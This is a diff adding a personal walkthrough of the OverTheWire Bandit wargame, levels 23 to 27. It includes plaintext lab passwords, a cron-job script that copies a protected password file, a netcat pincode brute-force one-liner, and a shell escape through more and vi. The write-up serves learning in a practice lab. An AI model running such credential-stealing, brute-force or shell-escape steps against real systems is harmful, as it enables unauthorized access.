@@ -392,4 +392,79 @@ NOTE 2: Keep in mind that your shell script is removed once executed, so you may
 
 sshpass -p QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G ssh bandit23@bandit.labs.overthewire.org -p 2220
 
-TODO
+cat /etc/cron.d/cronjob_bandit24
+
+cat /usr/bin/cronjob_bandit24.sh
+...
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+
+mkdir /tmp/nic
+
+bandit23@bandit:~$ cat /tmp/nic/my.script
+cat /etc/bandit_pass/bandit24 > /tmp/nic/b24
+
+chmod /tmp/nic 777
+cp /tmp/nic/my.script /var/spool/bandit24/foo/xxx
+
+bandit23@bandit:~$ cat /tmp/nic/b24
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+----------------------------------------------------------------------
+Level 24 -> Level 25
+
+"A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+You do not need to create new connections each time"
+
+sshpass -p VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ssh bandit24@bandit.labs.overthewire.org -p 2220
+
+bandit24@bandit:~$ nc localhost 30002
+
+$ seq 1111 9999 | sed 's/^/VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar /' | nc localhost 30002 | tee /tmp/nic/res
+
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+
+----------------------------------------------------------------------
+Level 25 -> Level 26
+
+"Logging in to bandit26 from bandit25 should be fairly easy... The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it."
+
+sshpass -p p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d ssh bandit25@bandit.labs.overthewire.org -p 2220
+
+bandit25@bandit:~$ cat /etc/passwd
+
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+bandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+
+bandit25@bandit:~$ cat bandit26.sshkey
+[elided]
+save locally as: ~/bandit26.private-key
+
+----------------------------------------------------------------------
+Level 26 -> Level 27
+
+"Good job getting a shell! Now hurry and grab the password for bandit27!"
+
+chmod 600 ~/bandit26.private-key
+
+(makke local terminal very small so more pages)
+
+ssh -i ~/bandit26.private-key bandit26@bandit.labs.overthewire.org -p 2220
+
+(then "v" to enter vi from more)
+(then :e /etc/bandit_pass/bandit26)
+to see...
+
+c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
+
+:set shell=/bin/bash
+
+:shell
+
+woo hoo, now we have a bandit26 shell
